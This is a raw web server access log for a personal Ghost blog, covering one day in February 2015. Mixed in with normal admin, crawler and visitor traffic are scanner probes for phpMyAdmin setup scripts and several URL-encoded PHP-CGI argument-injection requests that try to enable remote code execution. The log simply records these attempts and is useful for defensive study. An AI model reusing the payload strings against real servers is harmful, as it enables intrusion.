67.177.20.127 - - [09/Feb/2015:05:33:48 +0000] "GET /ghost/api/v0.1/users/me/?status=all&include=roles HTTP/1.1" 200 740 "http://brentonandtiffany.com/ghost/editor/1/" "Mozilla/5.0 (Linux; Android 4.4.2; SCH-I545 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.45 Mobile Safari/537.36"
67.177.20.127 - - [09/Feb/2015:05:33:50 +0000] "GET /ghost/api/v0.1/users/?limit=all&include=roles HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/editor/1/" "Mozilla/5.0 (Linux; Android 4.4.2; SCH-I545 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.45 Mobile Safari/537.36"
67.177.20.127 - - [09/Feb/2015:05:33:50 +0000] "GET /ghost/fonts/icons.woff HTTP/1.1" 304 - "http://brentonandtiffany.com/ghost/editor/1/" "Mozilla/5.0 (Linux; Android 4.4.2; SCH-I545 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.45 Mobile Safari/537.36"
67.177.20.127 - - [09/Feb/2015:05:33:51 +0000] "GET /ghost/api/v0.1/tags/?limit=all HTTP/1.1" 200 419 "http://brentonandtiffany.com/ghost/editor/1/" "Mozilla/5.0 (Linux; Android 4.4.2; SCH-I545 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.45 Mobile Safari/537.36"
223.27.230.174 - - [09/Feb/2015:05:43:54 +0000] "GET /ioio/ioi/io.php HTTP/1.1" 301 - "-" "-"
223.27.230.174 - - [09/Feb/2015:05:43:55 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
223.27.230.174 - - [09/Feb/2015:05:43:57 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 301 - "-" "-"
223.27.230.174 - - [09/Feb/2015:05:43:58 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
67.177.20.127 - - [09/Feb/2015:05:49:34 +0000] "GET / HTTP/1.1" 304 - "http://brentonandtiffany.com/ghost/editor/1/" "Mozilla/5.0 (Linux; Android 4.4.2; SCH-I545 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.45 Mobile Safari/537.36"
67.177.20.127 - - [09/Feb/2015:05:49:48 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
193.239.80.37 - - [09/Feb/2015:06:01:08 +0000] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
193.239.80.37 - - [09/Feb/2015:06:01:08 +0000] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
193.239.80.37 - - [09/Feb/2015:06:01:08 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
193.239.80.37 - - [09/Feb/2015:06:01:09 +0000] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
193.239.80.37 - - [09/Feb/2015:06:01:09 +0000] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
67.177.20.127 - - [09/Feb/2015:06:49:40 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
180.76.4.179 - - [09/Feb/2015:06:54:43 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
67.177.20.127 - - [09/Feb/2015:07:49:34 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
67.177.20.127 - - [09/Feb/2015:08:49:30 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
180.76.4.94 - - [09/Feb/2015:08:51:11 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
130.211.135.52 - - [09/Feb/2015:09:02:48 +0000] "GET /mfmf/mfm/mf.php HTTP/1.1" 301 - "-" "-"
130.211.135.52 - - [09/Feb/2015:09:02:48 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
130.211.135.52 - - [09/Feb/2015:09:02:49 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 301 - "-" "-"
130.211.135.52 - - [09/Feb/2015:09:02:49 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
66.249.73.131 - - [09/Feb/2015:09:42:18 +0000] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.139 - - [09/Feb/2015:09:42:18 +0000] "GET /rss/ HTTP/1.1" 200 551 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
67.177.20.127 - - [09/Feb/2015:09:49:23 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
114.38.89.40 - - [09/Feb/2015:09:53:07 +0000] "GET /scsc/scs/sc.php HTTP/1.1" 301 - "-" "-"
114.38.89.40 - - [09/Feb/2015:09:53:07 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
114.38.89.40 - - [09/Feb/2015:09:53:07 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 301 - "-" "-"
114.38.89.40 - - [09/Feb/2015:09:53:08 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
67.177.20.127 - - [09/Feb/2015:10:49:18 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
180.76.4.164 - - [09/Feb/2015:11:02:48 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
67.177.20.127 - - [09/Feb/2015:11:49:11 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
122.117.34.89 - - [09/Feb/2015:11:53:40 +0000] "GET /recordings/index.php HTTP/1.1" 301 - "-" "-"
67.177.20.127 - - [09/Feb/2015:12:49:04 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
180.76.4.209 - - [09/Feb/2015:12:55:59 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
67.177.20.127 - - [09/Feb/2015:13:48:56 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
223.220.243.147 - - [09/Feb/2015:14:02:25 +0000] "GET /fdfd/fdf/fd.php HTTP/1.1" 301 - "-" "-"
223.220.243.147 - - [09/Feb/2015:14:02:26 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
223.220.243.147 - - [09/Feb/2015:14:02:27 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 301 - "-" "-"
223.220.243.147 - - [09/Feb/2015:14:02:27 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
67.177.20.127 - - [09/Feb/2015:14:48:50 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
94.102.60.183 - - [09/Feb/2015:14:49:22 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
66.249.73.139 - - [09/Feb/2015:14:55:32 +0000] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.139 - - [09/Feb/2015:14:55:32 +0000] "GET /rss/ HTTP/1.1" 200 551 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.118 - - [09/Feb/2015:15:03:16 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
198.211.30.100 - - [09/Feb/2015:15:11:35 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 301 - "-" "the beast"
198.211.30.100 - - [09/Feb/2015:15:11:35 +0000] "GET /cgi-bin/test-cgi/ HTTP/1.1" 404 1859 "-" "the beast"
67.177.20.127 - - [09/Feb/2015:15:48:46 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET /assets/css/screen.css?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET /public/jquery.min.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET /assets/js/jquery.fitvids.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET /assets/js/index.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET /content/images/2015/02/bokeh_lights-2.jpg HTTP/1.1" 200 34950 "http://brentonandtiffany.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:13 +0000] "GET /assets/fonts/casper-icons.woff HTTP/1.1" 200 2260 "http://brentonandtiffany.com/assets/css/screen.css?v=68b0d971c5" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:14 +0000] "GET /favicon.ico HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:21 +0000] "GET /admin HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:21 +0000] "GET /admin/ HTTP/1.1" 302 70 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
127.0.0.1 - - [09/Feb/2015:16:16:21 +0000] "GET /ghost/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:21 +0000] "GET /ghost/css/ghost.min.css?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:21 +0000] "GET /ghost/scripts/ghost.min.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:21 +0000] "GET /ghost/scripts/vendor.min.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:22 +0000] "GET /ghost/fonts/icons.woff HTTP/1.1" 200 20828 "http://brentonandtiffany.com/ghost/css/ghost.min.css?v=68b0d971c5" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:27 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/signin/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:27 +0000] "GET /ghost/api/v0.1/users/me/?status=all&include=roles HTTP/1.1" 200 740 "http://brentonandtiffany.com/ghost/signin/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:28 +0000] "GET /ghost/api/v0.1/notifications/ HTTP/1.1" 200 20 "http://brentonandtiffany.com/ghost/signin/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:28 +0000] "GET /ghost/api/v0.1/posts/?status=all&staticPages=all&page=1&include=tags HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/signin/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:16:28 +0000] "GET /shared/img/user-image.png HTTP/1.1" 200 2421 "http://brentonandtiffany.com/ghost/1/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
155.101.208.122 - - [09/Feb/2015:16:21:30 +0000] "GET / HTTP/1.1" 304 - "http://brentonandtiffany.com/ghost/1/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
67.177.20.127 - - [09/Feb/2015:16:48:42 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
180.76.4.12 - - [09/Feb/2015:16:55:06 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
116.236.201.246 - - [09/Feb/2015:17:07:30 +0000] "GET /kdkd/kdk/kd.php HTTP/1.1" 301 - "-" "-"
116.236.201.246 - - [09/Feb/2015:17:07:30 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
211.136.170.146 - - [09/Feb/2015:17:07:31 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 301 - "-" "-"
211.136.170.146 - - [09/Feb/2015:17:07:31 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
157.55.39.192 - - [09/Feb/2015:17:19:20 +0000] "GET /robots.txt HTTP/1.1" 200 82 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.192 - - [09/Feb/2015:17:19:21 +0000] "GET / HTTP/1.1" 200 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)"
199.30.16.186 - - [09/Feb/2015:17:19:23 +0000] "GET /assets/css/screen.css?v=68b0d971c5 HTTP/1.1" 200 - "http://www.brentonandtiffany.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.16.186 - - [09/Feb/2015:17:19:23 +0000] "GET /public/jquery.min.js?v=68b0d971c5 HTTP/1.1" 200 - "http://www.brentonandtiffany.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.16.186 - - [09/Feb/2015:17:19:23 +0000] "GET /content/images/2015/02/bokeh_lights-2.jpg HTTP/1.1" 200 34950 "http://www.brentonandtiffany.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.16.186 - - [09/Feb/2015:17:19:23 +0000] "GET /assets/fonts/casper-icons.ttf HTTP/1.1" 200 - "http://www.brentonandtiffany.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.16.186 - - [09/Feb/2015:17:19:23 +0000] "GET /assets/js/jquery.fitvids.js?v=68b0d971c5 HTTP/1.1" 200 - "http://www.brentonandtiffany.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.16.186 - - [09/Feb/2015:17:19:23 +0000] "GET /assets/js/index.js?v=68b0d971c5 HTTP/1.1" 200 - "http://www.brentonandtiffany.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
203.190.113.83 - - [09/Feb/2015:17:33:16 +0000] "GET /kgkg/kgk/kg.php HTTP/1.1" 301 - "-" "-"
203.190.113.83 - - [09/Feb/2015:17:33:17 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
203.190.113.83 - - [09/Feb/2015:17:33:17 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 301 - "-" "-"
203.190.113.83 - - [09/Feb/2015:17:33:18 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 301 - "-" "-"
66.249.73.147 - - [09/Feb/2015:17:43:59 +0000] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.131 - - [09/Feb/2015:17:44:00 +0000] "GET /author/brenton/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
67.177.20.127 - - [09/Feb/2015:17:48:38 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
66.249.73.147 - - [09/Feb/2015:18:23:20 +0000] "GET /author/brenton/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.131 - - [09/Feb/2015:18:31:55 +0000] "GET /assets/css/screen.css?v=dab8509cd0 HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.147 - - [09/Feb/2015:18:31:56 +0000] "GET /assets/js/jquery.fitvids.js?v=dab8509cd0 HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.139 - - [09/Feb/2015:18:31:57 +0000] "GET /assets/js/index.js?v=dab8509cd0 HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.139 - - [09/Feb/2015:18:31:58 +0000] "GET /assets/js/index.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/author/brenton/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.147 - - [09/Feb/2015:18:31:59 +0000] "GET /public/jquery.min.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/author/brenton/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.147 - - [09/Feb/2015:18:31:59 +0000] "GET /assets/css/screen.css?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/author/brenton/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.131 - - [09/Feb/2015:18:32:00 +0000] "GET /assets/js/jquery.fitvids.js?v=68b0d971c5 HTTP/1.1" 200 - "http://brentonandtiffany.com/author/brenton/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
67.177.20.127 - - [09/Feb/2015:18:48:33 +0000] "POST /ghost/api/v0.1/authentication/token HTTP/1.1" 200 - "http://brentonandtiffany.com/ghost/settings/general/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
180.76.4.95 - - [09/Feb/2015:19:03:02 +0000] "GET / HTTP/1.1" 200 2408 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
